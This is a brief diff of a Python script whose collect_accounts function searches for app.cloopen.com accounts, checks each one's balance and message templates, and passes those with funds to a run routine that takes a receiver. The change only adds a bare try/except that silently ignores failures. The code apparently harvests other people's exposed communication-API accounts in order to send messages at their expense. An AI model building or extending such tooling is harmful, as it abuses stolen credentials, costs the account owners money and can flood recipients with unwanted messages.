@@ -34,13 +34,16 @@ def run(account: Cloopen, recvr):
 
 def collect_accounts():
     for account in search_all('app.cloopen.com', max_page=6):
-        info = account.query_account_info()
-        if info['statusCode'] == '000000':
-            balance = float(info['Account']['balance'])
-            if balance > 0:
-                account.balance = balance
-                if account.load_valid_template_ids():
-                    yield account
+        try:
+            info = account.query_account_info()
+            if info['statusCode'] == '000000':
+                balance = float(info['Account']['balance'])
+                if balance > 0:
+                    account.balance = balance
+                    if account.load_valid_template_ids():
+                        yield account
+        except:
+            pass
 
 
 if __name__ == '__main__':
